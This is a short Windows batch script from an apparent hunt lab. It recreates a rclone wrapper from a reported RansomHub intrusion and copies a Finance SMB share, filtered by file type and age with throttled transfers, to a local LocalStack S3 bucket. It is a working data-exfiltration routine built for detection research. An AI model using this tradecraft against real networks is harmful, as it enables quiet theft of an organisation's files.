@echo off
REM rcl.bat
REM Hunt Lab recreation of the rclone wrapper from The DFIR Report
REM "Hide Your RDP: Password Spray Leads to RansomHub Deployment" (2025-06).
REM
REM Original report: rclone copied a target SMB share to a remote SFTP server,
REM filtered by a hand-picked file extension list, with --max-age and bandwidth
REM caps to avoid noisy bursts.
REM
REM Lab swap: target = LocalStack S3 (s3://ransomhub-exfil-lab) on the docker
REM host. No real off-network egress.

set RCLONE=C:\Users\Public\rclone.exe
set INCLUDE=C:\Users\Public\include.txt
set SOURCE=\\win-server\Finance
REM rclone "connection string" form — encodes the entire S3 backend inline so
REM we don't need a named remote (no rclone.conf, no `rclone config create`).
REM Previously this batch used `hunt-lab-s3:` as a named remote which was
REM never defined anywhere, so rclone would error out before any exfil happened.
set REMOTE=:s3,provider=Other,endpoint=http://192.168.56.10:4566,access_key_id=test,secret_access_key=test,region=us-east-1,force_path_style=true,no_check_bucket=true:ransomhub-exfil-lab/finance/

"%RCLONE%" copy "%SOURCE%" "%REMOTE%" ^
    --include-from "%INCLUDE%" ^
    --max-age 30d ^
    --transfers 4 ^
    --multi-thread-streams 4 ^
    --bwlimit 8M ^
    --log-file C:\Users\Public\rcl.log ^
    --log-level INFO
